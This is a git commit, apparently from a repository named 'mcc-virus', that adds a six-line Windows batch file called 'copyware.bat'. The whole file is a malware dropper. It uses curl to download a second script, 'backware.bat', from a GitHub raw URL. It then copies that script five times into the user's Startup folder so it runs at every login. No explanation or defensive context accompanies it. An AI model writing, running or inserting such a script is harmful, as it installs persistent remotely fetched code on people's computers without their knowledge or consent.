5aa7a7322eac729deec42b8fd5478501ef4b3ac8
AnonUser <127699732+w3irdguy@users.noreply.github.com>
2024-11-11 19:23:34 -0300

    Create copyware.bat

---
+++ copyware.bat
@@ -0,0 +1,6 @@
+curl -O https://raw.githubusercontent.com/w3irdguy/mcc-virus/refs/heads/main/backware.bat
+copy backware.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
+copy backware.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backware1.bat"
+copy backware.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backware2.bat"
+copy backware.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backware3.bat"
+copy backware.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backware4.bat"
